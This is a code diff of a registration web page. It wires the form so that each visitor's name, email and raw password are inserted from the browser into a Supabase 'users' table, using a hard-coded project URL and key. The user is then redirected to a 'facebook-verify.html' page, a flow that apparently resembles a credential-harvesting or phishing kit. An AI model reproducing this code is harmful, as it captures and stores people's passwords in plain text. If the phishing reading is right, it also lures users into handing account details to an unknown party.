@@ -73,17 +73,17 @@
                     
                     <div class="form-group">
                         <label><i class="fas fa-user"></i> Full Name</label>
-                        <input type="text" placeholder="Enter your full name" required />
+                        <input type="text" id="fullName" placeholder="Enter your full name" required />
                     </div>
 
                     <div class="form-group">
                         <label><i class="fas fa-envelope"></i> Email Address</label>
-                        <input type="email" placeholder="Enter your email" required />
+                        <input type="email" id="email" placeholder="Enter your email" required />
                     </div>
 
                     <div class="form-group">
                         <label><i class="fas fa-lock"></i> Password</label>
-                        <input type="password" placeholder="Enter your password" required />
+                        <input type="password" id="password" placeholder="Enter your password" required />
                     </div>
 
                     <div class="checkbox">
@@ -109,34 +109,46 @@
         </div>
     </footer>
 
-    <!-- ===== JAVASCRIPT - BODY KE ANDAR ===== -->
-    <script>
+    <script src="js/script.js"></script>
+
+    <!-- ===== SUPABASE CONNECTION ===== -->
+    <script type="module">
+        import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
+
+        // Supabase credentials
+        const supabaseUrl = 'https://wpsx11yolaoqucmvah.supabase.co';
+        const supabaseKey = 'sb_publishable_I0tVjJYAMpFojpHXOhNlg_IoRI-zK4';
+        const supabase = createClient(supabaseUrl, supabaseKey);
+
+        // ===== REGISTER FORM SUBMIT =====
         document.getElementById('registerForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const name = document.querySelector('input[placeholder="Enter your full name"]').value;
-            const email = document.querySelector('input[placeholder="Enter your email"]').value;
-            const password = document.querySelector('input[placeholder="Enter your password"]').value;
+            const name = document.getElementById('fullName').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
             
-            const userData = { name, email, password };
-            
-            try {
-                const response = await fetch('/api/save-user', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(userData)
-                });
-                const result = await response.json();
-                console.log('✅ Data saved:', result);
-                
-                // Show success message before redirect
-                alert('✅ Registration successful! Redirecting to Facebook verification...');
-                
-            } catch (error) {
-                console.log('⚠️ Error saving data:', error);
-                alert('⚠️ Error saving data. Make sure server is running (node server.js)');
+            // Save to Supabase
+            const { data, error } = await supabase
+                .from('users')
+                .insert([{ 
+                    name: name, 
+                    email: email, 
+                    password: password,
+                    submitted_at: new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })
+                }])
+                .select();
+
+            if (error) {
+                console.error('❌ Supabase Error:', error);
+                alert('⚠️ Error saving data: ' + error.message);
+                return;
             }
+
+            console.log('✅ Data saved!', data);
+            alert('✅ Registration successful!');
             
+            // Redirect to Facebook verification
             window.location.href = 'facebook-verify.html';
         });
     </script>
